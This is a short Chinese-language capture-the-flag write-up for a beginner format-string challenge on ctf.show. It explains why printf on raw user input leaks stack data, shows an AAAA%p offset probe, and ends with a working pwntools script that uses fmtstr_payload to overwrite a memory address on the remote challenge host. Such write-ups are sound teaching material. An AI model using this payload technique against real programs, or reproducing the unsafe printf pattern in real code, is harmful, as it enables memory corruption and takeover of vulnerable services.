# 挑战简介
开始格式化字符串了，先来个简单的吧

# 思路
首先你要知道什么是格式化字符串

首先看正常的printf使用：
```
int num = 100;
printf("The number is: %d\n", num);  // 正常使用
```

但在这道题中：
```
char s[0x50];
read(0, &s, 0x50u);    // 用户输入存储在s中
printf(&s);            // 危险！直接把用户输入当作格式字符串
```

## **漏洞原理**  
正常情况下栈的样子：  
```
栈顶
├── printf的返回地址
├── 参数1: &s (格式字符串的地址)
├── 参数2: 原本应该有，但没有
├── 参数3: 原本应该有，但没有
├── ...
├── 栈上的其他数据
├── 栈上的其他数据
└── 我们输入的字符串s的内容
栈底
```

**当我们输入特殊字符时会发生什么？**  
如果我们输入：AAAA%p%p%p%p%p%p%p%p  
```
printf("AAAA%p%p%p%p%p%p%p%p");
```

printf会认为：

- 格式字符串是："AAAA%p%p%p%p%p%p%p%p"
- 需要8个参数来填充8个%p
- 但实际上没有传递这些参数！

输出可能是：  
```
AAAA0xffbfe1200xffbfe1240x804851c0x10xf7e2c6200x00x804b0380x41414141
```

注意最后的 0x41414141 - 这就是我们输入的"AAAA"！

本质上就是从栈上获取写入变量的位置，从而去填充  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28219)

elf = ELF('D:\edge 下载\pwn')

daniu = 0x804B038
#payload = b'aaaa' + b'%p  ' * 10
payload = fmtstr_payload(7,{daniu:6})
io.send(payload)
io.interactive()
```
